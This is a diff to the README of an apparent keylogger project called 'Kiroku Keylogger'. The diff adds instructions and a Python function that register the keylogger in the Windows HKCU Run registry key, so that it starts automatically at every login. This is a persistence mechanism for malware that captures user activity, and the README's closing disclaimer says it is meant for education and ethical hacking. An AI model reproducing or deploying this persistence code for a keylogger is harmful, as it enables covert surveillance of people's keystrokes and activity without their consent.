@@ -81,6 +81,19 @@ Kiroku Keylogger is a sophisticated tool designed to capture and monitor a wide 
      ```python
      import winreg
      ```
+  2. Add this function:
+     ```python
+     def add_to_registry():
+         exe_path = sys.executable
+         try:
+             registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+             key_name = 'Kiroku'
+             winreg.SetValueEx(registry_key, key_name, 0, winreg.REG_SZ, exe_path)
+             time.sleep(0.01)
+             winreg.CloseKey(registry_key)
+         except Exception as e:
+             print(f"Failed to add executable to registry: {e}")
+     ```
 ## Warning
 
 This tool is intended strictly for educational purposes and ethical hacking only. Unauthorized use of this tool for malicious activities or without explicit consent is illegal and strictly prohibited.
